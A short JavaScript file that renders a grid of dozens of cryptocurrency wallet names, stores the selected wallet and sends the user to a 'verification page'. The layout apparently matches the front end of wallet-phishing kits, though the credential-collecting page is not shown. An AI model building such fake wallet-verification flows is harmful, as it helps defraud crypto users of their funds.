const wallets = [
  "Metamask", "Trust", "Coinbase", "Xumm", "Cardano", "Daedalus", "Yoroi",
  "CCVault", "Gero", "Nami", "Solana", "Phantom", "Solflare", "Sollet",
  "Solong", "Exodus", "Avalanche", "Velas", "crypto.com", "Blockchain",
  "Binance Smart Chain", "Safepal", "Argent", "Fortmatic", "Aktionariat",
  "Keyring Pro", "BitKeep", "SparkPoint", "OwnBit", "Infinty Wallet",
  "Wallet.io", "Infinito", "Torus", "Nash", "BitPay", "imTOken", "Ambire",
  "Apollox", "Bitski", "Bobablocks", "Crossmint", "Defiant", "Fireblocks",
  "Kryptogo", "Ledger", "Now", "Nufinetes", "Onekey", "Paper", "Pier",
  "Prema", "Rice", "Safemoon", "Secux", "Sequence", "Tokenary", "Unipass",
  "Venly", "Verso", "Wallet3", "Polkadot", "Filecoin", "IOST", "Qtum",
  "Waves", "Algorand", "Zcash", "Vechain", "Tezos", "Stellar", "Tron",
  "Terra", "Cosmos", "Metis", "Optimism", "Injective", "Other Wallet"
];

const grid = document.getElementById("walletsGrid");

wallets.forEach(wallet => {
  const card = document.createElement("a");
  card.className = "wallet-card";
  card.href = "wallet-connect.html"; // Go to the verification page instead

  // Save selected wallet to localStorage when clicked
  card.addEventListener('click', () => {
    localStorage.setItem('selectedWallet', wallet);
  });

  card.innerHTML = `
    <img src="wallets/${wallet.toLowerCase().replace(/ /g, '-').replace(/\./g, '')}.png" alt="${wallet}" class="wallet-logo" />
    <div class="wallet-name">${wallet}</div>
  `;
  grid.appendChild(card);
});
